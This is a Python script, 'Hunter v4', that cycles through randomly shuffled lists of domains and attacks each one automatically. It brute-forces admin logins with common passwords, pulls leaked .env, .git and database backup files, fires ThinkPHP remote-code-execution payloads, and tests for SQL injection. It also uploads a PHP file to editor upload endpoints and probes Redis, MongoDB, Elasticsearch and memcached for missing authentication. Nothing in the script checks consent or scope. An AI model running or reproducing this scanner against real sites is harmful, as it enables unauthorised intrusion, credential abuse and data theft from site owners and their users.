# -*- coding: utf-8 -*-
#!/usr/bin/env python3
"""Hunter v4 - all vuln auto-hunt (ASCII comments)"""
import urllib.request, re, socket, time, base64

OUT = "/tmp/hunter_out.txt"
UA = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

def fetch(url, timeout=6, data=None, headers=None):
    try:
        h = dict(UA)
        if headers: h.update(headers)
        req = urllib.request.Request(url, data=data, headers=h)
        return urllib.request.urlopen(req, timeout=timeout).read()
    except Exception as e:
        code = getattr(e, "code", 0)
        if code in (200,301,302,403,500): return b"ERR:%d" % code
        return b""

def log(s):
    with open(OUT, "a") as f: f.write(s + "\n")
    print(s)

def port_open(ip, port, t=1.5):
    try:
        s = socket.socket(); s.settimeout(t)
        r = s.connect_ex((ip, port)); s.close()
        return r == 0
    except: return False

def check(target):
    name = target.split(".")[0]
    base = "http://" + target
    try: ip = socket.gethostbyname(target)
    except: return

    # 1. weak admin passwords (needs dashboard keywords)
    for p in ["/admin","/login","/admin/login","/manage","/system"]:
        try:
            h = fetch(base+p, 4)
            if len(h) > 300:
                for pw in ["admin","123456","admin123",name,name+"123","admin888","12345678"]:
                    data = ("username=admin&password="+pw).encode()
                    try:
                        req = urllib.request.Request(base+p, data=data, headers=UA)
                        h3 = urllib.request.urlopen(req, timeout=4).read()
                        if len(h3) > 5000 and len(h3) != len(h):
                            low = h3[:8000].lower()
                            if any(k in low for k in [b"logout", b"log out", b"\xe9\x80\x80\xe5\x87\xba", b"\xe6\xb3\xa8\xe9\x94\x80", b"dashboard", b"welcome", b"\xe6\xac\xa2\xe8\xbf\x8e"]):
                                log(f"[PASS] {target}{p} admin/{pw} {len(h3)}B")
                                return
                    except: pass
        except: pass

    # 2. phpinfo / no disable_functions
    for pp in ["/test.php?phpinfo=true","/phpinfo.php","/info.php","/test.php","/i.php"]:
        h = fetch(base+pp, 4)
        if len(h) > 3000:
            if b"phpinfo" in h[:3000].lower() or b"PHP Version" in h:
                log(f"[PHPINFO] {target}{pp} {len(h)}B")
                if b"disable_functions" in h:
                    m = re.search(rb"disable_functions[^<]*<[^>]*>([^<]*)", h)
                    df = m.group(1).decode("utf-8","ignore").strip() if m else "?"
                    if not df or df == "no value":
                        log(f"[NO_DF!!] {target}{pp} disable_functions empty=RCE")
                return

    # 3. config/source leaks
    for pp in ["/.env", "/.git/config", "/web.config", "/.svn/entries", "/config.php.bak", "/db.sql", "/backup.zip", "/www.zip", "/data.sql"]:
        try:
            h = fetch(base+pp, 4)
            if len(h) > 100:
                txt = h[:500].lower()
                if b"<!doctype" not in txt and b"<html" not in txt and b"404" not in txt:
                    log(f"[LEAK] {target}{pp} {len(h)}B")
                    if pp.endswith(".sql") or pp.endswith(".zip"): return
        except: pass

    # 4. framework RCE
    for tp in ["/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
               "/index.php?s=captcha&_method=__construct&filter[]=phpinfo"]:
        h = fetch(base+tp, 5)
        if len(h) > 5000 and b"PHP Version" in h:
            log(f"[TP-RCE!!] {target} ThinkPHP RCE")
            return

    # 5. no-auth services
    if port_open(ip, 6379):
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((ip, 6379)); s.send(b"PING\r\n")
            r = s.recv(100); s.close()
            if b"PONG" in r:
                log(f"[REDIS-NO-AUTH!!] {target}({ip}) Redis no-auth")
                return
        except: pass
    if port_open(ip, 27017):
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((ip, 27017))
            s.send(bytes.fromhex("3a0000000100000000000000d40700000000000061646d696e2e24636d6400000000000100000000130000001069734d6173746572000100000000"))
            r = s.recv(100); s.close()
            if b"ismaster" in r or b"ok" in r:
                log(f"[MONGO-NO-AUTH!!] {target}({ip}) MongoDB no-auth")
        except: pass
    if port_open(ip, 9200):
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((ip, 9200))
            s.send(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
            r = s.recv(200); s.close()
            if b"cluster_name" in r:
                log(f"[ES-NO-AUTH!!] {target}({ip}) Elasticsearch no-auth")
        except: pass
    if port_open(ip, 11211):
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((ip, 11211)); s.send(b"stats\r\n")
            r = s.recv(100); s.close()
            if b"STAT" in r:
                log(f"[MEMCACHED-NO-AUTH!!] {target}({ip}) memcached no-auth")
        except: pass

    # 6. SQL injection
    for pp in ["/?id=1", "/news.asp?id=1", "/product.asp?id=1", "/index.php?id=1"]:
        try:
            b1 = fetch(base+pp, 4); b2 = fetch(base+pp+"'", 4)
            if len(b1) > 500 and len(b1) != len(b2) and len(b2) > 50:
                log(f"[SQLI?] {target}{pp} {len(b1)}vs{len(b2)}")
                return
        except: pass

    # 7. upload endpoints (JSON校验版)
    for pp in ["/kindeditor/php/upload_json.php", "/ueditor/php/controller.php?action=uploadimage"]:
        try:
            g = fetch(base+pp, 3)
            if len(g) < 10: continue
            body = b"--x\r\nContent-Disposition: form-data; name=\"imgFile\"; filename=\"a.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo();?>\r\n--x--\r\n"
            req = urllib.request.Request(base+pp, data=body, headers={"Content-Type":"multipart/form-data; boundary=x","User-Agent":"Mozilla/5.0"})
            r = urllib.request.urlopen(req, timeout=4).read()
            rl = r.strip()
            if 10 < len(rl) < 5000 and rl[:1] == b"{":
                rlow = rl.lower()
                if (b"state" in rlow and (b"success" in rlow or b"error" in rlow)) or (b"url" in rlow and b"error" in rlow):
                    log(f"[UPLOAD-JSON] {target}{pp} {len(r)}B {rl[:80]}")
        except: pass

    # 8. port summary
    ports = []
    for port, svc in [(3306,"MySQL"),(3389,"RDP"),(22,"SSH"),(21,"FTP"),(8080,"HTTP8080")]:
        if port_open(ip, port): ports.append(f"{port}({svc})")
    if ports:
        log(f"[PORTS] {target}({ip}) | {','.join(ports)}")

def main():
    import random, subprocess
    while True:
        try:
            domains = [l.strip() for l in open("/tmp/hunter_domains.txt") if l.strip()]
        except: domains = []
        random.shuffle(domains)
        for d in domains[:200]:
            try: check(d)
            except: pass
        log(f"[ROUND] {time.strftime('%H:%M')} done")
        try:
            subprocess.run("shuf -n 300 /tmp/clean_com.txt > /tmp/hunter_domains.txt", shell=True)
        except: pass
        time.sleep(3)

if __name__ == "__main__":
    main()
